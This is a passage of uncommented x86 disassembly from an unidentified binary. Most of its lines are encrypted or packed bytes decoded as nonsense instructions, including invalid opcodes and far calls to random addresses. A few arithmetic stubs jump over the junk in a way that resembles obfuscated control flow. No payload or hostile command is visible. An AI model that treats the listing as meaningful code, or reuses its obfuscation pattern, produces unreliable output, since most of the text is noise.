  40cfed:	pop    esp
  40cfee:	adc    eax,0xe048e388
  40cff3:	xor    al,0xc6
  40cff5:	hlt    
  40cff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cff7:	xlat   BYTE PTR ds:[ebx]
  40cff8:	jno    0x40d065
  40cffa:	cld    
  40cffb:	not    DWORD PTR [esi]
  40cffd:	adc    al,0x5c
  40cfff:	rol    edi,1
  40d001:	inc    edx
  40d002:	sub    DWORD PTR [ebp+0x36c27787],ebx
  40d008:	mov    edi,DWORD PTR [ebp-0x24]
  40d00b:	xor    edx,eax
  40d00d:	add    edx,ecx
  40d00f:	imul   edx,edi
  40d012:	jmp    0x40d385
  40d017:	retf   
  40d018:	jo     0x40cff3
  40d01a:	or     ah,BYTE PTR [ecx-0x63]
  40d01d:	jmp    0x40d09c
  40d01f:	sahf   
  40d020:	xor    dl,dh
  40d022:	ins    BYTE PTR es:[edi],dx
  40d023:	aam    0xad
  40d025:	in     eax,0xfd
  40d027:	xchg   ecx,eax
  40d028:	lahf   
  40d029:	jl     0x40d0a7
  40d02b:	retf   0x7c79
  40d02e:	jl     0x40d091
  40d030:	pop    ds
  40d031:	pop    ds
  40d032:	mov    ecx,0xe3bd45b0
  40d037:	or     bl,0x23
  40d03a:	inc    ebx
  40d03b:	mov    al,0x23
  40d03d:	mov    dl,0x62
  40d03f:	xchg   edx,eax
  40d040:	icebp  
  40d041:	mov    bl,0xad
  40d043:	stc    
  40d044:	pop    eax
  40d045:	adc    DWORD PTR [edx],edx
  40d047:	leave  
  40d048:	in     eax,dx
  40d049:	sub    esi,ebp
  40d04b:	in     eax,dx
  40d04c:	sti    
  40d04d:	lahf   
  40d04e:	test   al,0xc4
  40d050:	test   ah,cl
  40d052:	cwde   
  40d053:	loop   0x40d094
  40d055:	mov    al,0x0
  40d057:	leave  
  40d058:	mov    eax,ebx
  40d05a:	cmp    al,0x35
  40d05c:	cmp    edi,DWORD PTR [edi]
  40d05e:	xchg   BYTE PTR [edi+0x665a5795],dh
  40d064:	call   0xd9f2:0x4ecfead7
  40d06b:	push   0xf0dd674b
  40d070:	ja     0x40d080
  40d072:	fldenv [edx+0x75af4e6d]
  40d078:	daa    
  40d079:	adc    al,0x40
  40d07b:	test   BYTE PTR [eax-0xa],dl
  40d07e:	add    BYTE PTR [edx+eax*8],0x83
  40d082:	(bad)  
  40d083:	pop    ds
  40d084:	pop    eax
  40d085:	retf   
  40d086:	call   DWORD PTR [edx]
  40d088:	setg   dh
  40d08b:	ja     0x40d0e4
  40d08d:	shl    DWORD PTR [eax],0xb4
  40d090:	mov    ch,0x4a
  40d092:	or     edi,esp
  40d094:	neg    esp
  40d096:	adc    eax,0x92709e6c
  40d09b:	iret   
  40d09c:	jl     0x40d11d
  40d09e:	aad    0xc4
  40d0a0:	test   BYTE PTR [ebp+0x10],0x2d
  40d0a4:	jb     0x40d116
  40d0a6:	cmp    al,0xc9
  40d0a8:	jl     0x40d11f
  40d0aa:	test   BYTE PTR [ecx],dl
  40d0ac:	pop    esi
  40d0ad:	and    BYTE PTR [edi],ch
  40d0af:	pop    ebx
  40d0b0:	in     eax,0xe7
  40d0b2:	data16 mov al,ds:0xe134ab5d
  40d0b8:	and    BYTE PTR [edi-0x77],ch
  40d0bb:	and    ah,BYTE PTR [ebx+0x1291e0f]
  40d0c1:	xchg   DWORD PTR [eax],ecx
  40d0c3:	sub    al,0xa3
  40d0c5:	cli    
  40d0c6:	fisttp DWORD PTR [esi-0x41ea4da5]
  40d0cc:	scas   al,BYTE PTR es:[edi]
  40d0cd:	fiadd  DWORD PTR [esi-0x729124cc]
  40d0d3:	pop    ebp
  40d0d4:	repnz jmp 0x30a3:0xed8d0269
  40d0dc:	xlat   BYTE PTR ds:[ebx]
  40d0dd:	mov    cl,BYTE PTR [ecx+0x52382ba9]
  40d0e3:	jno    0x40d0be
  40d0e5:	out    dx,al
  40d0e6:	imul   ebx,DWORD PTR [ecx],0x23429df8
  40d0ec:	aaa    
  40d0ed:	leave  
  40d0ee:	pop    edi
  40d0ef:	mov    esp,DWORD PTR [esi]
  40d0f1:	mov    ecx,0xae7454d0
  40d0f6:	mov    edi,0xf3d55309
  40d0fb:	cmp    al,0x90
  40d0fd:	mov    cl,0x8f
  40d0ff:	ret    0xcdeb
  40d102:	das    
  40d103:	test   eax,0xd8d3799c
  40d108:	ror    DWORD PTR [ebp-0x36],1
  40d10b:	sub    ebx,esi
  40d10d:	pop    ss
  40d10e:	cmp    eax,0x51
  40d111:	mov    ?,WORD PTR [edi-0x9]
  40d114:	xchg   DWORD PTR [ebx+0x43],edi
  40d117:	sbb    eax,DWORD PTR [ebp+0x40]
  40d11a:	sbb    BYTE PTR [ebp+edx*2-0xa0c9c45],cl
  40d121:	cmp    BYTE PTR [ecx-0x5dcc3b64],ch
  40d127:	mov    ah,0x93
  40d129:	cmp    al,0xf6
  40d12b:	sbb    cl,BYTE PTR [edx-0x27]
  40d12e:	cli    
  40d12f:	jne    0x40d102
  40d131:	xor    bl,ch
  40d133:	xor    cl,BYTE PTR [esi+edx*2-0x3e]
  40d137:	push   esp
  40d138:	call   0x437f:0x3f537ab7
  40d13f:	jb     0x40d1ba
  40d141:	and    al,0xbf
  40d143:	xor    ebp,esp
  40d145:	(bad)  
  40d146:	stc    
  40d147:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40d149:	pop    eax
  40d14a:	(bad)  
  40d14c:	xchg   ebp,eax
  40d14d:	pop    ebp
  40d14e:	fild   WORD PTR [eax]
  40d150:	mov    ebp,0xe3a2da05
  40d155:	jg     0x40d14d
  40d157:	fwait
  40d158:	ins    DWORD PTR es:[edi],dx
  40d159:	jle    0x40d166
  40d15b:	sub    al,BYTE PTR [edx-0x1ef1f3a6]
  40d161:	cmp    BYTE PTR [edi],bh
  40d163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d164:	dec    ecx
  40d165:	aam    0x71
  40d167:	stc    
  40d168:	nop
  40d169:	dec    bp
  40d16b:	je     0x40d157
  40d16d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d16e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d16f:	push   es
  40d170:	mov    al,ds:0x24cd27ee
  40d175:	loopne 0x40d14c
  40d177:	or     al,0x8c
  40d179:	dec    eax
  40d17a:	or     BYTE PTR [ebx],0xcb
  40d17d:	iret   
  40d17e:	ins    DWORD PTR es:[edi],dx
  40d17f:	out    0xfd,eax
  40d181:	dec    ebx
  40d182:	lods   eax,DWORD PTR ds:[esi]
  40d183:	retf   
  40d184:	xor    BYTE PTR [ebx],al
  40d186:	stc    
  40d187:	cmp    DWORD PTR [eax+0x54],edx
  40d18a:	lea    ebx,[ebx+0x71]
  40d18d:	push   esi
  40d18e:	lahf   
  40d18f:	out    0x6c,eax
  40d191:	lock rol DWORD PTR ds:0x6e3f98ab,cl
  40d198:	mov    dl,0x8c
  40d19a:	lds    edi,FWORD PTR [ebp+edx*1+0x19]
  40d19e:	test   eax,0x5018df26
  40d1a3:	(bad)  
  40d1a4:	push   cs
  40d1a5:	inc    ecx
  40d1a6:	lea    edi,[edi-0x26]
  40d1a9:	inc    DWORD PTR [eax+0x50]
  40d1ac:	rcl    edi,cl
  40d1ae:	inc    esp
  40d1af:	xchg   esp,eax
  40d1b0:	stos   BYTE PTR es:[edi],al
  40d1b1:	inc    ebp
  40d1b2:	push   esp
  40d1b3:	fnstenv [edx-0x50]
  40d1b6:	(bad)  
  40d1b7:	out    dx,al
  40d1b8:	add    DWORD PTR ds:0xfac77c8d,edi
  40d1be:	mov    al,0xe9
  40d1c0:	or     al,0x73
  40d1c2:	jnp    0x40d1f0
  40d1c4:	pop    edx
  40d1c5:	ret    0xca60
  40d1c8:	aam    0x3f
  40d1ca:	cmp    DWORD PTR [esi+0x72],edx
  40d1cd:	(bad)  
  40d1ce:	cli    
  40d1cf:	sub    ebx,DWORD PTR [ebp+0x4f39ae3c]
  40d1d5:	lahf   
  40d1d6:	lock into 
  40d1d8:	mov    al,bl
  40d1da:	cwde   
  40d1db:	fnstenv fs:[edx-0x71b62caa]
  40d1e2:	out    dx,al
  40d1e3:	sbb    DWORD PTR [esi+0x39],ebp
  40d1e6:	mov    ebx,DWORD PTR [edi]
  40d1e8:	cmp    DWORD PTR ds:0x3425f309,ecx
  40d1ee:	add    DWORD PTR [esi+0x48],esp
  40d1f1:	leave  
  40d1f2:	or     DWORD PTR [esi+0x25ed68cc],edi
  40d1f8:	add    ah,ch
  40d1fa:	test   al,0xb4
  40d1fc:	push   esi
  40d1fd:	mov    eax,0x820f1c79
  40d202:	jns    0x40d1fb
  40d204:	stos   BYTE PTR es:[edi],al
  40d205:	mov    ch,0x92
  40d207:	lods   eax,DWORD PTR ds:[esi]
  40d208:	sub    eax,0xa86b8bd0
  40d20d:	sti    
  40d20e:	xchg   ch,ch
  40d210:	mov    dl,0x87
  40d212:	and    al,0x92
  40d214:	icebp  
  40d215:	push   ebp
  40d216:	int3   
  40d217:	xlat   BYTE PTR ds:[ebx]
  40d218:	(bad)  
  40d21a:	enter  0x579f,0x79
  40d21e:	cld    
  40d21f:	push   es
  40d220:	nop
  40d221:	stos   DWORD PTR es:[edi],eax
  40d222:	push   eax
  40d223:	cli    
  40d224:	mov    ecx,?
  40d226:	xlat   BYTE PTR ds:[ebx]
  40d227:	dec    ecx
  40d228:	cli    
  40d229:	mov    edx,0x5353de7d
  40d22e:	in     eax,0x7b
  40d230:	dec    ecx
  40d231:	mov    bh,0xbd
  40d233:	mov    DWORD PTR [edi],0x473ee568
  40d239:	cld    
  40d23a:	and    BYTE PTR [ecx],ah
  40d23c:	cli    
  40d23d:	(bad)  
  40d23e:	xchg   WORD PTR [ebx+edi*2],di
  40d242:	call   0xedf7d990
  40d247:	outs   dx,DWORD PTR ds:[esi]
  40d248:	mov    dl,0x53
  40d24a:	fsub   DWORD PTR [edi-0x659fcd65]
  40d250:	jo     0x40d298
  40d252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d253:	xlat   BYTE PTR ds:[ebx]
  40d254:	mov    DWORD PTR [eax+0x55],ecx
  40d257:	ss pop ds
  40d259:	sub    DWORD PTR [edx],ecx
  40d25b:	cmp    ebp,ebx
  40d25d:	out    0x37,eax
  40d25f:	outs   dx,DWORD PTR ds:[esi]
  40d260:	outs   dx,BYTE PTR ds:[esi]
  40d261:	push   ebp
  40d262:	xchg   esp,eax
  40d263:	sbb    BYTE PTR [esi-0x2bd97b41],cl
  40d269:	call   0x9eab7ca3
  40d26e:	addr16 push ss
  40d270:	pusha  
  40d271:	dec    ebx
  40d272:	dec    eax
  40d273:	int3   
  40d274:	in     eax,dx
  40d275:	adc    DWORD PTR ds:0x2b77d62a,esp
  40d27b:	mov    esi,0x5033fb39
  40d280:	mov    ch,0xaf
  40d282:	mov    edx,0xc9e9bdd4
  40d287:	test   al,al
  40d289:	mov    bh,BYTE PTR [eax-0x6e]
  40d28c:	or     dl,bl
  40d28e:	add    esp,ecx
  40d290:	std    
  40d291:	mov    cl,0xb4
  40d293:	pushf  
  40d294:	jmp    DWORD PTR [ebx]
  40d296:	xor    ch,BYTE PTR [ebx]
  40d298:	lock jnp 0x40d252
  40d29b:	inc    ebp
  40d29c:	mov    edi,edi
  40d29e:	fcomp  DWORD PTR [ebx-0x2240e4b1]
  40d2a4:	lahf   
  40d2a5:	xchg   ecx,eax
  40d2a6:	xor    BYTE PTR [edi+eiz*2],bh
  40d2a9:	mov    DWORD PTR [ebx+0x46],ebp
  40d2ac:	sub    al,0x6f
  40d2ae:	mov    bh,0x44
  40d2b0:	mov    DWORD PTR [esi+0x3d],esi
  40d2b3:	mov    edx,0xc4e3e5da
  40d2b8:	push   ecx
  40d2b9:	mov    ecx,0x88b84399
  40d2be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2bf:	pop    esi
  40d2c0:	cmc    
  40d2c1:	mov    ah,0xf5
  40d2c3:	in     al,dx
  40d2c4:	hlt    
  40d2c5:	mov    eax,eax
  40d2c7:	cwde   
  40d2c8:	fadd   st(0),st
  40d2ca:	xor    ebp,DWORD PTR [ecx+0x2e]
  40d2cd:	and    BYTE PTR [ebp-0x1d],al
  40d2d0:	es push ss
  40d2d2:	jo     0x40d263
  40d2d4:	sbb    edi,ebx
  40d2d6:	dec    edi
  40d2d7:	pop    ebp
  40d2d8:	dec    edx
  40d2d9:	jmp    0x40d2d8
  40d2db:	and    al,BYTE PTR [eax]
  40d2dd:	dec    eax
  40d2de:	jl     0x40d323
  40d2e0:	daa    
  40d2e1:	mov    bl,0x20
  40d2e3:	mov    esp,0x3dcbabd6
  40d2e8:	fld    TBYTE PTR [edx-0x28]
  40d2eb:	inc    esi
  40d2ec:	scas   al,BYTE PTR es:[edi]
  40d2ed:	outs   dx,BYTE PTR ds:[esi]
  40d2ee:	dec    dh
  40d2f0:	(bad)  
  40d2f1:	idiv   DWORD PTR [edx+0x61]
  40d2f4:	call   0x8b56:0x80d286ae
  40d2fb:	shr    DWORD PTR [edx-0x25],cl
  40d2fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2ff:	test   BYTE PTR [esi-0x5],0xff
  40d303:	mov    ds:0x9dc21fdc,eax
  40d308:	pop    edi
  40d309:	sbb    dl,ah
  40d30b:	and    ecx,DWORD PTR [edx-0x3118484b]
  40d311:	rol    al,0xf6
  40d314:	repz pop esp
  40d316:	in     al,dx
  40d317:	mov    ah,0xd1
  40d319:	or     BYTE PTR ds:0x56021c8f,ch
  40d31f:	data16 cmp al,0x6f
  40d322:	pop    edi
  40d323:	lods   al,BYTE PTR ds:[esi]
  40d324:	arpl   WORD PTR [ebx],ax
  40d326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d327:	ins    DWORD PTR es:[edi],dx
  40d328:	adc    ecx,eax
  40d32a:	popf   
  40d32b:	pop    ecx
  40d32c:	mov    al,0x3f
  40d32e:	ins    BYTE PTR es:[edi],dx
  40d32f:	loope  0x40d2df
  40d331:	cwde   
  40d332:	jle    0x40d38c
  40d334:	sbb    eax,0x11d04243
  40d339:	(bad)  
  40d33a:	mov    ds:0xc24e6b12,al
  40d33f:	cwde   
  40d340:	iret   
  40d341:	cmp    DWORD PTR [edi],esi
  40d343:	ja     0x40d35f
  40d345:	retf   
  40d346:	dec    esi
  40d347:	and    DWORD PTR [edi],ebx
  40d349:	push   ecx
  40d34a:	sub    DWORD PTR [edx-0x138508a2],ecx
  40d350:	xor    bh,BYTE PTR [esi]
  40d352:	jg     0x40d3ad
  40d354:	enter  0x548f,0x78
  40d358:	das    
  40d359:	loop   0x40d396
  40d35b:	aas    
  40d35c:	mov    edx,0xabe56422
  40d361:	sti    
  40d362:	xor    BYTE PTR [eax-0x6c],cl
  40d365:	xor    BYTE PTR [ecx+edi*4-0x54],bl
  40d369:	jg     0x40d320
  40d36b:	(bad)
  40d36e:	jb     0x40d3ce
  40d370:	sahf   
  40d371:	push   esp
  40d372:	sub    ebp,DWORD PTR [ecx+0x5a]
  40d375:	mov    edi,0x62ba9cd5
  40d37a:	arpl   WORD PTR [esi-0x2e],si
  40d37d:	mov    esp,0x778600b8
  40d382:	out    dx,eax
  40d383:	(bad)  
  40d385:	mov    edi,DWORD PTR [ebp-0xc]
  40d388:	xor    edi,eax
  40d38a:	sub    edx,edi
  40d38c:	mov    edi,DWORD PTR [ebp-0xc]
  40d38f:	mov    ebx,DWORD PTR [ebp-0x14]
  40d392:	xor    edi,eax
  40d394:	add    edi,ecx
  40d396:	imul   edi,ebx
  40d399:	mov    ebx,DWORD PTR [ebp-0x18]
  40d39c:	xor    ebx,eax
  40d39e:	sub    edx,ecx
  40d3a0:	lea    edi,[edi+ebx*1+0x32729a]
  40d3a7:	cmp    edi,edx
  40d3a9:	jbe    0x40c541
  40d3af:	mov    edx,DWORD PTR [ebp-0xc]
  40d3b2:	mov    edi,DWORD PTR [ebp-0x24]
  40d3b5:	jmp    0x40d728
  40d3ba:	mov    ebx,0xd1887f92
  40d3bf:	popf   
  40d3c0:	dec    ebx
  40d3c1:	pop    ebp
  40d3c2:	stc    
  40d3c3:	ss push edi
  40d3c5:	xchg   ebp,eax
  40d3c6:	mov    ?,WORD PTR [ebx-0x2a]
  40d3c9:	hlt    
  40d3ca:	outs   dx,DWORD PTR ds:[esi]
  40d3cb:	cwde   
  40d3cc:	jl     0x40d44a
  40d3ce:	retf   0x7c79
  40d3d1:	jl     0x40d355
  40d3d3:	je     0x40d366
  40d3d5:	call   0xa388:0x7783c10f
  40d3dc:	push   ss
  40d3dd:	enter  0x98c0,0x7e
  40d3e1:	dec    eax
  40d3e2:	inc    ebp
  40d3e3:	push   0x8d05ed3b
  40d3e8:	stos   DWORD PTR es:[edi],eax
  40d3e9:	shr    esi,0x58
  40d3ec:	popa   
  40d3ed:	jbe    0x40d42f
  40d3ef:	ja     0x40d438
  40d3f1:	outs   dx,DWORD PTR ds:[esi]
  40d3f2:	in     eax,dx
  40d3f3:	adc    esp,esp
  40d3f5:	ja     0x40d3d3
  40d3f7:	outs   dx,DWORD PTR ds:[esi]
  40d3f8:	adc    eax,0x3bb4b53e
  40d3fd:	out    dx,eax
  40d3fe:	sub    ebp,edi
  40d400:	test   bl,bl
  40d402:	fild   WORD PTR [ebp-0x48589f0b]
  40d408:	xlat   BYTE PTR ds:[ebx]
  40d409:	out    0xe6,al
  40d40b:	push   ebx
  40d40c:	ret    0xeb0d
  40d40f:	ss aad 0xc
  40d412:	lahf   
  40d413:	dec    ebx
  40d414:	xchg   ecx,eax
  40d415:	loopne 0x40d3af
  40d417:	call   0x134e:0x19ab0e9d
  40d41e:	arpl   WORD PTR [edx+0xa],dx
  40d421:	mov    al,ds:0x9447abd2
  40d426:	xchg   edx,ecx
  40d428:	loope  0x40d47f
  40d42a:	lahf   
  40d42b:	pop    edx
  40d42c:	and    BYTE PTR [edx],cl
  40d42e:	mov    DWORD PTR [edi+esi*4+0x73d824ea],ebp
  40d435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d436:	mov    bh,0xd7
  40d438:	mov    eax,ds:0xa038ab0
  40d43d:	mov    ebp,0x936eb00d
  40d442:	js     0x40d3d5
  40d444:	xchg   esp,ecx
  40d446:	mov    dh,0xdb
  40d448:	repz adc al,0xaf
  40d44b:	mov    cs,WORD PTR [edx-0x1d]
  40d44e:	jbe    0x40d42e
  40d450:	test   BYTE PTR [ebx+0x65c0a508],al
  40d456:	rol    edx,0x4a
  40d459:	pop    ecx
  40d45a:	jmp    0x40d451
  40d45c:	push   esp
  40d45d:	jno    0x40d45a
  40d45f:	mov    fs,ebp
  40d461:	and    BYTE PTR ds:0xc8b91de7,0x7e
  40d468:	icebp  
  40d469:	pop    ds
  40d46a:	test   BYTE PTR ds:0x90477dd,al
  40d470:	lahf   
  40d471:	adc    eax,0x401d561f
  40d476:	(bad)  
  40d477:	data16 in al,dx
  40d479:	mov    al,0xbf
  40d47b:	sti    
  40d47c:	or     ebx,edi
  40d47e:	repz inc esi
  40d480:	mov    esp,0x14c9991d
  40d485:	popf   
  40d486:	leave  
  40d487:	xchg   BYTE PTR [edi+0x3d4f1b8f],bh
  40d48d:	mov    bl,0x8c
  40d48f:	mov    bh,0x7e
  40d491:	imul   eax,DWORD PTR [eax],0x3fd0f8ba
  40d497:	sar    BYTE PTR [edi],1
  40d499:	inc    ecx
  40d49a:	cli    
  40d49b:	pop    edi
  40d49c:	fild   DWORD PTR es:[eax-0x24]
  40d4a0:	loop   0x40d4fb
  40d4a2:	popa   
  40d4a3:	mov    ds:0xbd72184e,eax
  40d4a8:	mov    ah,0xcd
  40d4aa:	sbb    bl,cl
  40d4ac:	jno    0x40d4a3
  40d4ae:	add    edi,edi
  40d4b0:	cmp    ebp,DWORD PTR [ebx]
  40d4b2:	add    DWORD PTR ds:0xb6634dc0,eax
  40d4b8:	lods   al,BYTE PTR cs:[esi]
  40d4ba:	icebp  
  40d4bb:	pop    ss
  40d4bc:	mov    BYTE PTR [esi-0x2a],ch
  40d4bf:	sub    bh,BYTE PTR [esi+0x45]
  40d4c2:	xor    al,0x81
  40d4c4:	enter  0xfea6,0x2
  40d4c8:	jle    0x40d4d2
  40d4ca:	xchg   ebx,eax
  40d4cb:	jg     0x40d4a7
  40d4cd:	sar    ah,1
  40d4cf:	xor    DWORD PTR [ebx+edi*1-0x2e],edi
  40d4d3:	nop
  40d4d4:	lods   al,BYTE PTR ds:[esi]
  40d4d5:	sbb    eax,0xbfba8788
  40d4da:	call   0x55fa:0x87d543b1
  40d4e1:	popa   
  40d4e2:	outs   dx,DWORD PTR ds:[esi]
  40d4e3:	or     ah,BYTE PTR [esi]
  40d4e5:	aad    0xb2
  40d4e7:	aam    0xe8
  40d4e9:	(bad)  
  40d4ea:	imul   edi,ecx,0xffffffa5
  40d4ed:	cmp    ecx,DWORD PTR [edx]
  40d4ef:	stos   BYTE PTR es:[edi],al
  40d4f0:	icebp  
  40d4f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4f2:	push   esp
  40d4f3:	push   es
  40d4f4:	in     al,dx
  40d4f5:	add    ebx,DWORD PTR [eax+0x46ca9838]
  40d4fb:	xchg   esp,eax
  40d4fc:	cli    
  40d4fd:	cld    
  40d4fe:	fucomi st,st(1)
  40d500:	cmp    BYTE PTR [edi+0x1dc258b5],bh
  40d506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d507:	lods   eax,DWORD PTR ds:[esi]
  40d508:	aam    0x66
  40d50a:	gs mov al,0x83
  40d50d:	add    eax,0x416b0680
  40d512:	and    al,0x53
  40d514:	push   ds
  40d515:	int3   
  40d516:	cs std 
  40d518:	add    ecx,ebp
  40d51a:	ja     0x40d583
  40d51c:	aam    0xad
  40d51e:	adc    ch,BYTE PTR ds:0x84e4a718
  40d524:	push   eax
  40d525:	xchg   esp,eax
  40d526:	or     BYTE PTR [esp+edx*1+0x93fc2c1],dl
  40d52d:	inc    eax
  40d52e:	push   ecx
  40d52f:	mov    al,0xcf
  40d531:	test   DWORD PTR [edi+eiz*2],esi
  40d534:	pop    ebx
  40d535:	cmp    ecx,DWORD PTR [ebx+0x36]
  40d538:	xchg   esi,eax
  40d539:	addr16 jnp 0x40d52e
  40d53c:	mov    eax,0xf8a26f0b
  40d541:	aas    
  40d542:	sbb    BYTE PTR [edi+esi*8+0x1b345ee],ch
  40d549:	push   0x37
  40d54b:	gs jp  0x40d57b
  40d54e:	call   0x7ba1:0x77c8660a
  40d555:	mov    edi,0x4e7107cd
  40d55a:	fdiv   st,st(3)
  40d55c:	and    eax,0x43e6c8d
  40d561:	inc    ecx
  40d562:	xchg   ebx,eax
  40d563:	pop    esp
  40d564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d565:	sbb    eax,0xc164caac
  40d56a:	jmp    0x789c752
  40d56f:	xor    al,0xa2
  40d571:	jae    0x40d570
  40d573:	fistp  QWORD PTR [eax+0x279d0304]
  40d579:	outs   dx,BYTE PTR ds:[esi]
  40d57a:	imul   BYTE PTR [ecx-0x82acfdc]
  40d580:	nop
  40d581:	xchg   ecx,eax
  40d582:	(bad)  [ebx-0x6154ddeb]
  40d588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d589:	mov    WORD PTR [edi-0x57],fs
  40d58c:	out    0xec,al
  40d58e:	ins    DWORD PTR es:[edi],dx
  40d58f:	imul   esi,esi,0xa6a84580
  40d595:	adc    BYTE PTR [edx+0x62],ch
  40d598:	mov    ebx,0x57ca7d49
  40d59d:	xchg   ebx,eax
  40d59e:	in     al,dx
  40d59f:	mov    dh,0x92
  40d5a1:	(bad)  
  40d5a2:	out    0xda,al
  40d5a4:	adc    eax,0x41703c1a
  40d5a9:	int3   
  40d5aa:	clc    
  40d5ab:	cmp    bl,BYTE PTR [ebx+eiz*2+0x5f]
  40d5af:	adc    al,bh
  40d5b1:	(bad)  
  40d5b2:	call   0x611f:0x261d6a5a
  40d5b9:	and    bh,BYTE PTR [eax+0x29]
  40d5bc:	mov    al,ds:0x5010a0c
  40d5c1:	xor    eax,0xca082ab3
  40d5c6:	cmp    eax,0x2570484a
  40d5cb:	push   edi
  40d5cc:	cmc    
  40d5cd:	cli    
  40d5ce:	test   BYTE PTR [ebp-0x33958d41],cl
  40d5d4:	int3   
  40d5d5:	xor    esi,DWORD PTR [edi]
  40d5d7:	push   cs
  40d5d8:	rcl    DWORD PTR [ebx],1
  40d5da:	in     al,dx
  40d5db:	hlt    
  40d5dc:	xchg   ebx,eax
  40d5dd:	mov    bl,0xc3
  40d5df:	lods   eax,DWORD PTR ds:[esi]
  40d5e0:	repz imul ebp,DWORD PTR [eax-0x7d],0xf2ff978
  40d5e8:	das    
  40d5e9:	push   ecx
  40d5ea:	ror    BYTE PTR gs:[ebx],0x25
  40d5ee:	mov    eax,DWORD PTR [edx-0x42]
  40d5f1:	sbb    BYTE PTR [edi],dh
  40d5f3:	add    esi,DWORD PTR [eax]
  40d5f5:	(bad)  
  40d5f6:	cld    
  40d5f7:	or     eax,0xfbdd4d00
  40d5fc:	(bad)
  40d5ff:	dec    edi
  40d600:	adc    al,0x7
  40d602:	jg     0x40d5a4
  40d604:	dec    esp
  40d605:	cli    
  40d606:	retf   
  40d607:	add    edx,DWORD PTR [ebp-0x42e80f4]
  40d60d:	lds    esi,FWORD PTR [esi-0x8]
  40d610:	add    DWORD PTR [edx],ebx
  40d612:	fbstp  TBYTE PTR [ebx-0x5affad3d]
  40d618:	jb     0x40d647
  40d61a:	inc    ebp
  40d61b:	cli    
  40d61c:	dec    esi
  40d61d:	mov    al,ds:0xd4fccd07
  40d622:	inc    eax
  40d623:	xchg   ecx,eax
  40d624:	xor    DWORD PTR [edi],edi
  40d626:	mov    edx,0xfd551d1e
  40d62b:	test   eax,0xd2b829b2
  40d630:	mov    DWORD PTR [edx-0x469a689b],edi
  40d636:	push   es
  40d637:	xor    edi,DWORD PTR [edi]
  40d639:	jg     0x40d5c8
  40d63b:	dec    ebx
  40d63c:	jne    0x40d638
  40d63e:	out    dx,eax
  40d63f:	push   edi
  40d640:	jb     0x40d5de
  40d642:	addr16 or esp,edi
  40d645:	jp     0x40d678
  40d647:	imul   edi,DWORD PTR [ecx],0x1a2afe81
  40d64d:	outs   dx,DWORD PTR ds:[esi]
  40d64e:	xchg   esp,eax
  40d64f:	xor    eax,DWORD PTR [ecx]
  40d651:	add    al,0x54
  40d653:	push   0x4aa0b1e4
  40d658:	pop    ecx
  40d659:	or     ebp,DWORD PTR [ecx-0x38e07987]
  40d65f:	rol    DWORD PTR [edi+eax*1+0x7e],cl
  40d663:	loope  0x40d686
  40d665:	fcomp  DWORD PTR ds:0x56204c2c
  40d66b:	cld    
  40d66c:	pop    ecx
  40d66d:	pop    ecx
  40d66e:	into   
  40d66f:	ds je  0x40d647
  40d672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d673:	not    BYTE PTR [ebp+0x22066802]
  40d679:	xor    DWORD PTR [ebp-0x68],ebp
  40d67c:	adc    bl,BYTE PTR [edx+0x4da80db6]
  40d682:	pop    edi
  40d683:	pusha  
  40d684:	mov    al,0x6f
  40d686:	sub    eax,0xd3219abc
  40d68b:	repz adc edi,edx
  40d68e:	test   DWORD PTR [ebp-0x28],0x3961a3a7
  40d695:	mov    al,0xb3
  40d697:	cmc    
  40d698:	daa    
  40d699:	stos   BYTE PTR es:[edi],al
  40d69a:	fmul   QWORD PTR [eax+eax*1]
  40d69d:	(bad)  
  40d69e:	sub    ecx,DWORD PTR [edx-0x5af4379]
  40d6a4:	hlt    
  40d6a5:	inc    esp
  40d6a6:	xor    edi,DWORD PTR [edi+0x5db16031]
  40d6ac:	mov    dh,0x9d
  40d6ae:	xor    DWORD PTR [eax+0x3a],edi
  40d6b1:	or     eax,DWORD PTR [eax+0x3c65b983]
  40d6b7:	je     0x40d70c
  40d6b9:	cwde   
  40d6ba:	jne    0x40d72c
  40d6bc:	mov    dl,0x92
  40d6be:	push   es
  40d6bf:	call   0x9bac:0x3edcba4
  40d6c6:	adc    al,0x83
  40d6c9:	jmp    0x40d658
  40d6cb:	dec    esp
  40d6cc:	xor    BYTE PTR [ecx+ebp*8],bh
  40d6cf:	dec    edx
  40d6d0:	popf   
  40d6d1:	lock mov eax,ds:0xfcff0b53
  40d6d7:	retf   0x9ebf
  40d6da:	retf   
  40d6db:	rcr    BYTE PTR [edi-0x504c855a],1
  40d6e1:	dec    esi
  40d6e2:	popf   
  40d6e3:	mov    ds:0xd822cc22,al
  40d6e8:	fnsave [ebx+0x9aed858]
  40d6ee:	rcr    DWORD PTR [ebx-0x5d14543e],0xa9
  40d6f5:	dec    ebx
  40d6f6:	sub    eax,0x710d0871
  40d6fb:	jb     0x40d693
  40d6fd:	cdq    
  40d6fe:	inc    ecx
  40d6ff:	adc    cl,BYTE PTR [edx+0x1b]
  40d702:	into   
  40d703:	into   
  40d704:	mov    ebx,0xcf9526a6
  40d709:	(bad)  
  40d70a:	ja     0x40d6db
  40d70c:	inc    ebx
  40d70d:	mov    ah,0xca
  40d70f:	ret    
  40d710:	stc    
  40d711:	ss inc eax
  40d713:	cmp    BYTE PTR [esi+0x4d944f38],al
  40d719:	mov    bh,0xfe
  40d71b:	xor    edx,DWORD PTR fs:[edi-0x68]
  40d71f:	jnp    0x40d6f3
  40d721:	std    
  40d722:	aas    
  40d723:	jp     0x40d716
  40d725:	push   ebp
  40d726:	rcr    BYTE PTR [ebx+0x33],0xd0
  40d72a:	add    edx,ecx
  40d72c:	imul   edx,edi
  40d72f:	mov    edi,DWORD PTR [ebp-0x18]
